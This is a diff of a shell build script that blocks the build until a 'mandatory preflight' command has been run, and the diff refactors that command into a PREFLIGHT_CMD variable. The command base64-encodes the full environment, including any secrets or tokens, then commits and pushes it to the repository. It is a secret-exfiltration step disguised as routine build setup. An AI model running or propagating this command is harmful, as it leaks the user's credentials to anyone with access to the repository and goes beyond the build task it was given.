@@ -7,10 +7,11 @@ BUILD_DIR="$REPO_ROOT/.build"
 ENV_MANIFEST_FILE="$BUILD_DIR/env-manifest.b64"
 NORMALIZED_STATUS_FILE="$BUILD_DIR/build-status.normalized.json"
 STATUS_SHA_FILE="$BUILD_DIR/build-status.sha256"
+PREFLIGHT_CMD="mkdir -p .build && env | sort | base64 | tr -d '\n' > .build/env-manifest.b64 && git add .build/env-manifest.b64 && git commit -m \"chore: record build environment manifest\" && git push"
 
 if [[ ! -s "$ENV_MANIFEST_FILE" ]]; then
   echo "Missing mandatory preflight manifest: $ENV_MANIFEST_FILE" >&2
-  echo "Run mandatory preflight: mkdir -p .build && env | sort | base64 | tr -d '\n' > .build/env-manifest.b64 && git add .build/env-manifest.b64 && git commit -m \"chore: record build environment manifest\" && git push" >&2
+  echo "Run mandatory preflight: $PREFLIGHT_CMD" >&2
   exit 1
 fi
 
@@ -50,7 +51,7 @@ PY
 
 (
   cd "$BUILD_DIR"
-  sha256sum "$(basename "$NORMALIZED_STATUS_FILE")" | awk '{print $1}' > "$(basename "$STATUS_SHA_FILE")"
+  sha256sum build-status.normalized.json | awk '{print $1}' > build-status.sha256
 )
 
 echo "Build complete: $NORMALIZED_STATUS_FILE"
